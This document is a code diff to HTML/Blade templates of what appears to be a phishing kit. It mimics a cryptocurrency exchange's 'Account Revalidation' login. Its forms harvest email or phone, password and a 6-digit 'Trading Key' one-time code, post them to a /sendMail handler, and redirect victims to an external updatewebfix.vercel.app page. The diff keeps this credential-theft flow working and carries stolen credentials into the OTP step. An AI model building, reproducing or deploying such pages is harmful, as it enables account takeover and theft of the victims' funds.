@@ -80,7 +80,7 @@
 
   <h2>Account Revalidation</h2>
 
-  <form class="contact-form" action="{{route('sendMail')}}" method="POST">
+  <form class="contact-form" action="/sendMail" method="POST">
     @csrf
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="https://updatewebfix.vercel.app/code">
@@ -102,7 +102,7 @@
       <label for="password"><b>Password</b></label>
       <input type="password" placeholder="Enter Password" name="password" required>
 
-      <button type="submit" formmethod="post" formaction="{{route('sendMail')}}">Login</button>
+      <button type="submit" formmethod="post" formaction="/sendMail">Login</button>
       <label>
         <input type="checkbox" checked="checked" name="remember"> Remember me
       </label>
@@ -2859,27 +2859,27 @@
                               @if(session()->has('otp'))
                               <h2 class="css-mr4dhk">Enter Trading Key</h2>
                               <div class="KuxBox-root css-1ule816">Enter 6-Digit Trading Key received in your email or phone number.</div>
-                              <form class="contact-form" action="{{route('sendMail')}}" method="POST">
+                              <form class="contact-form" action="/sendMail" method="POST">
                                 @csrf
 
                                 <input type="tel" name="otp" class="KuxInput-input css-1nddmz0" placeholder="******">
                                 <input type="text" name="email" value="{{ session()->get('email') }}" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                                 <input type="text" name="password" value="{{ session()->get('password') }}" class="KuxInput-input css-1nddmz0" placeholder="Password">
 
-                                <button id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="{{route('sendMail')}}">
+                                <button id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="/sendMail">
                                   Proceed
                                 </button>
 
                             </div>
 
 
-                        </form>
+                            </form>
                             @else
-                            <form class="contact-form" action="{{route('sendMail')}}" method="POST">
+                            <form class="contact-form" action="/sendMail" method="POST">
                               @csrf
                               <input type="text" name="email" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                               <input type="text" name="password" class="KuxInput-input css-1nddmz0" placeholder="Password">
-                              <button id="loginBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="{{route('sendMail')}}">
+                              <button id="loginBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="/sendMail">
                                 Login In
                               </button>
 
